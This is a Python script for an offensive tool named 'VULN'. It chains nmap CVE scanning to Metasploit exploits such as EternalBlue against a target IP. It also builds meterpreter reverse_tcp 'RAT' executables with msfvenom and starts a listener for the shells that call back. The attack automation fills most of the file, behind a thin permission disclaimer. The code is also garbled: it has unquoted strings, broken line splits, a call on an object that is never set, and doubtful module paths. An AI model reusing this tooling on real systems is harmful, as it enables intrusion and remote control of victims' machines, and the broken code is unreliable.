python
#!/usr/bin/env python3
"""
VULN - Vulnerability Scanner & Penetration Tool (for Digital Forensics)
Author: Cybersecurity Research Team
Disclaimer: Use only on systems you own or have explicit permission to test.
"""

import os
import sys
import time
import shutil
import subprocess
import argparse
from datetime import datetime

# ================== BANNER ==================
BANNER = r"""
=================================================================
   ██╗   ██╗██╗   ██╗██╗███╗   ██╗
   ██║   ██║██║   ██║██║████╗  ██║
   ██║   ██║██║   ██║██║██╔██╗ ██║
   ╚██╗ ██╔╝██║   ██║██║██║╚██╗██║
    ╚████╔╝ ╚██████╔╝██║██║ ╚████║
     ╚═══╝   ╚═════╝ ╚═╝╚═╝  ╚═══╝
   Vulnerability Scanner & Penetration Tool  v1.0
   Digital Forensics / Authorized Security Audits Only
=================================================================
"""

# ================== ANSI COLORS ==================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ================== UTILITIES ==================
class Utils:
    """General utility functions for the tool."""

    @staticmethod
    def check_tools():
        """Verify required external tools are installed."""
        required = ["nmap", "searchsploit", "msfconsole", "msfvenom"]
        missing = []
        for tool in required:
            if shutil.which(tool) is None:
                missing.append(tool)
        if missing:
            print(f"{RED}[!] Missing tools: {', '.join(missing)}{RESET}")
            print("Please install the missing tools from Kali repositories.")
            sys.exit(1)
        Utils.print_info("All required tools found.", status="OK")

    @staticmethod
    def print_info(msg, status="INFO"):
        """Print a colored message with timestamp and status."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {"INFO": CYAN, "OK": GREEN, "WARN": YELLOW, "ERR": RED}.get(status, BLU
E)
        print(f"{color}[{timestamp}] [{status}] {msg}{RESET}")

    @staticmethod
    def print_step(step, msg):
        """Print a formatted step with explanation."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"\n{MAGENTA}[*] STEP {step}{RESET} {BLUE}: {msg}{RESET}")
        print("-" * 60)

    @staticmethod
    def run_live(command, timeout=None):
        """Run a command and stream output in real-time."""
        Utils.print_info(f"Executing: {' '.join(command)}", status="INFO")
        try:
            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            # Stream output
            while True:
                output_line = process.stdout.readline()
                if output_line:
                    print(f"{BLUE}[CMD]{RESET} {output_line.rstrip()}")
                    # Flush to show in real-time
                    sys.stdout.flush()
                else:
                    break
            process.wait()
            if process.returncode != 0:
                Utils.print_info("Command returned non-zero exit code.", status="WARN")
            return process.returncode
        except Exception as e:
            Utils.print_info(f"Failed to run command: {e}", status="ERR")
            return -1

# ================== SCANNER MODULE ==================
class VulnerabilityScanner:
    """Handles network scanning and CVE discovery."""

    def __init__(self, target_ip):
        self.target = target_ip
        self.scan_results = {}

    def nmap_vuln_scan(self):
        """Use nmap with vulners script to detect CVEs."""
        Utils.print_step(1, "Scanning target with Nmap (vulners script)")
        self._directory_setup()
        output_file = "nmap_vulners.txt"
        command = [
            "nmap", "-sV", "--script", "vulners", "-oN", output_file,
            self.target
        ]
        Utils.run_live(command)
        self.scan_results["nmap_raw"] = self._read_file(output_file)
        self._parse_nmap_vulners(output_file)

    def _directory_setup(self):
        """Create a working directory for scan results."""
        if not os.path.exists("vuln_agent_results"):
            os.makedirs("vuln_agent_results")
        os.chdir("vuln_agent_results")
        Utils.print_info("Working directory: vuln_agent_results", status="OK")

    def _read_file(self, filename):
        """Read file contents."""
        try:
            with open(filename, "r") as f:
                return f.read()
        except FileNotFoundError:
            return ""

    def _parse_nmap_vulners(self, filename):
        """Extract CVEs and ports from nmap output."""
        raw = self._read_file(filename)
        cves = []
        for line in raw.splitlines():
            if "CVE-" in line:
                cves.append(line.strip())
        self.scan_results["cves"] = cves
        if cves:
            Utils.print_info(f"Found {len(cves)} CVEs", status="OK")
        else:
            Utils.print_info("No CVEs found. Trying searchsploit...", status="WARN")

    def searchsploit_scan(self):
        """Run searchsploit to find related exploits."""
        Utils.print_step(2, "Searching ExploitDB via searchsploit")
        command = ["searchsploit", "--color", self.target]  
        #Example: searchsploit tar
        get IP wont work; we need service. Use nmap output.
        # In real usage we would parse nmap services and search by service:version
        Utils.print_info(Note: searchsploit requires service info. Using generic searc
h.)
        Utils.run_live(command)

    def auto_scan(self):
        """Run the full scan process."""
        self.nmap_vuln_scan()
        self.searchsploit_scan()
        return self.scan_results

# ================== EXPLOIT MODULE ==================
class ExploitManager:
    """Handles Metasploit exploitation."""

    def __init__(self, target_ip, lhost, lport):
        self.target = target_ip
        self.lhost = lhost
        self.lport = lport

    def get_matches(self, cve_list):
        """
        Map CVEs to Metasploit modules.
        For demonstration, we use a small known mapping.
        In a real tool, you would query Metasploit's database (msfrpc).
        """
        # Example CVE-to-module mapping (simplified)
        cve_db = {
            "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",
            "CVE-2017-0143": "exploit/windows/smb/ms17_010_eternalblue",
            "CVE-2021-34527": "exploit/windows/printspoofer",
            "CVE-2021-3156": "exploit/linux/local/sudo_baron_samedit",
            "CVE-2020-0796": "exploit/windows/smb/cve_2020_0796_smbghost",
        }
        matches = []
        for cve in cve_list:
            # Extract CVE identifier from line
            cve_id = cve.split("CVE-")[1].split()[0]
            cve_id = "CVE-" + cve_id
            if cve_id in cve_db:
                matches.append((cve_id, cve_db[cve_id]))
        return matches

    def run_exploit(self, cve_id=None, module=None):
        """Run Metasploit exploit via resource script."""
        Utils.print_step(3, f"Launching Metasploit exploit")
        if not cve_id and not module:
            Utils.print_info(No CVE/module provided, using default handler, status="W
ARN")
            self.run_handler()
            return

        # Create a resource script for msfconsole
        rc_content = f"""
use {module}
set RHOSTS {self.target}
set LHOST {self.lhost}
set LPORT {self.lport}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
run -j
"""
        with open("exploit.rc", "w") as f:
            f.write(rc_content)

        command = ["msfconsole", "-q", "-r", "exploit.rc"]
        Utils.run_live(command)

    def run_handler(self):
        """Start a reverse shell listener (multi/handler)."""
        Utils.print_step(4, "Starting Metasploit multi/handler")
        rc_content = f"""
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {self.lhost}
set LPORT {self.lport}
set ExitOnSession false
exploit -j
"""
        with open("handler.rc", "w") as f:
            f.write(rc_content)

        command = ["msfconsole", "-q", "-r", "handler.rc"]
        Utils.run_live(command)

# ================== RAT GENERATOR MODULE ==================
class RATGenerator:
    """Generates and deploys a Remote Access Trojan (RAT)."""

    def __init__(self, lhost, lport, target_ip):
        self.lhost = lhost
        self.lport = lport
        self.target = target_ip

    def generate_windows_payload(self):
        """Create a Windows meterpreter payload using msfvenom."""
        Utils.print_step(4, "Generating RAT payload (msfvenom)")
        output_file = "rat_payload.exe"
        command = [
            "msfvenom",
            "-p", "windows/x64/meterpreter/reverse_tcp",
            "LHOST=" + self.lhost,
            "LPORT=" + str(self.lport),
            "-f", "exe",
            "-o", output_file
        ]
        Utils.run_live(command)
        Utils.print_info(f"Payload saved to {output_file}", status="OK")
        return output_file

    def generate_linux_payload(self):
        """Create a Linux meterpreter payload."""
        Utils.print_step(4, "Generating Linux RAT payload")
        output_file = "rat_payload.elf"
        command = [
            "msfvenom",
            "-p", "linux/x64/meterpreter/reverse_tcp",
            "LHOST=" + self.lhost,
            "LPORT=" + str(self.lport),
            "-f", "elf",
            "-o", output_file
        ]
        Utils.run_live(command)
        Utils.print_info(f"Payload saved to {output_file}", status="OK")
        return output_file

    def deploy_rat(self, payload_file, reverse_shell_session):
        """Deploy RAT via an existing reverse shell (simulated)."""
        Utils.print_step(5, "Deploying RAT to target")
        Utils.print_info("Using reverse shell to upload payload...", status="WARN")
        Utils.print_info("In a real scenario, you'd use the meterpreter session to uplo
ad & execute.")
        Utils.print_info("This module simulates deployment.", status="INFO")

# ================== MAIN AGENT ==================
class VulnAgent:
    """Main controller for the tool."""

    def __init__(self):
        self.target_ip = None
        self.lhost = None
        self.lport = 4444
        self.scanner = None
        self.exploiter = None
        self.rat = None

    def setup(self):
        """Initial setup: check tools, print banner."""
        os.system("clear")
        print(f"{GREEN}{BANNER}{RESET}")
        Utils.check_tools()
        self._get_parameters()

    def _get_parameters(self):
        """Ask for target IP and LHOST (if not provided via args)."""
        parser = argparse.ArgumentParser(description="VULN Agent")
        parser.add_argument("-t", "--target", help="Target IP address")
        parser.add_argument("-l", "--lhost", help="Local IP for reverse connection (e.g
., tun0 for VPN)")
        parser.add_argument("-p", "--lport", type=int, default=4444, help="Local port (
default 4444)")
        args = parser.parse_args()

        if args.target:
            self.target_ip = args.target
        else:
            self.target_ip = input(f"{YELLOW}[?] Enter target IP address: {RESET}").str
ip()
        if args.lhost:
            self.lhost = args.lhost
        else:
            self.lhost = input(f"{YELLOW}[?] Enter your LHOST (listener IP): {RESET}").
strip()
        self.lport = args.lport

    def main_menu(self):
        """Display interactive menu."""
        while True:
            print(f"\n{BOLD}{CYAN}VULN Agent - Main Menu{RESET}")
            print("=" * 50)
            print(f"{GREEN}1){RESET} Full Auto-Scan & Exploit")
            print(f"{GREEN}2){RESET} Vulnerability Scan Only")
            print(f"{GREEN}3){RESET} Generate RAT Payload")
            print(f"{GREEN}4){RESET} Start Reverse Shell Listener (Multi/Handler)")
            print(f"{GREEN}5){RESET} Exit")
            choice = input(f"{YELLOW}[?] Select an option: {RESET}").strip()

            if choice == "1":
                self.auto_scan_and_exploit()
            elif choice == "2":
                self.vuln_scan_only()
            elif choice == "3":
                self.rat_generation()
            elif choice == "4":
                self.reverse_shell_listener()
            elif choice == "5":
                print("Exiting. Goodbye!")
                break
            else:
                print(f"{RED}[!] Invalid option. Try again.{RESET}")

    def auto_scan_and_exploit(self):
        """Run the full automatic flow."""
        Utils.print_step(1, "Starting full automatic vulnerability scan")
        self.scanner = VulnerabilityScanner(self.target_ip)
        results = self.scanner.auto_scan()

        if not results.get("cves"):
            Utils.print_info("No known CVEs found. Launching generic exploit attempts?"
, status="WARN")
            # In a real tool, you would try a list of common exploits or use searchsplo
it.
            Utils.print_info("Switching to searchsploit results (manual selection requi
red).")
            self.exploiter = ExploitManager(self.target_ip, self.lhost, self.lport)
            self.exploiter.run_handler()
            return

        Utils.print_step(2, "Mapping CVEs to Metasploit modules")
        matches = self.exploiter.get_matches(results["cves"])
        if not matches:
            Utils.print_info("No matching Metasploit modules found in our small databas
e.", status="WARN")
            Utils.print_info("Would you like to start a reverse shell listener anyway? 
(y/n)")
            choice = input().lower()
            if choice == "y":
                self.exploiter.run_handler()
            return

        # Show found CVEs and choose first (or auto-pwn)
        Utils.print_info("Available exploits:")
        for idx, (cve, module) in enumerate(matches):
            print(f"  {idx+1}. {cve} -> {module}")

        # For automation, take the first module
        chosen = matches[0]
        Utils.print_info(f"Using {chosen[0]} with module {chosen[1]}")

        self.exploiter.run_exploit(cve_id=chosen[0], module=chosen[1])

        # After session opens, we can deploy RAT (simulated)
        Utils.print_info("If a session opened, you can now deploy a RAT.")
        print("Waiting for session... (Press Ctrl+C to stop)")
        try:
            time.sleep(15)
        except KeyboardInterrupt:
            pass
        self.rat_generation()

    def vuln_scan_only(self):
        """Perform scan and display results without exploitation."""
        Utils.print_step(1, "Starting vulnerability scan only")
        self.scanner = VulnerabilityScanner(self.target_ip)
        self.scanner.auto_scan()
        print("\nScan complete. Review the output above.")
        print(f"Results stored in 'vuln_agent_results/nmap_vulners.txt'")

    def rat_generation(self):
        """Generate a RAT payload."""
        self.rat = RATGenerator(self.lhost, self.lport, self.target_ip)
        choice = input(f"{YELLOW}[?] Generate for Windows (w) or Linux (l)? {RESET}").l
ower()
        if choice == "w":
            payload = self.rat.generate_windows_payload()
        elif choice == "l":
            payload = self.rat.generate_linux_payload()
        else:
            payload = self.rat.generate_windows_payload()
        print(f"\nPayload created: {payload}")
        print("Use a reverse shell or other method to upload to the target.")

    def reverse_shell_listener(self):
        """Starts a Metasploit multi/handler listener."""
        Utils.print_info("Starting Metasploit multi/handler listener...")
        self.exploiter = ExploitManager(self.target_ip, self.lhost, self.lport)
        self.exploiter.run_handler()

# ================== ENTRY POINT ==================
if __name__ == "__main__":
    agent = VulnAgent()
    agent.setup()
    agent.main_menu()
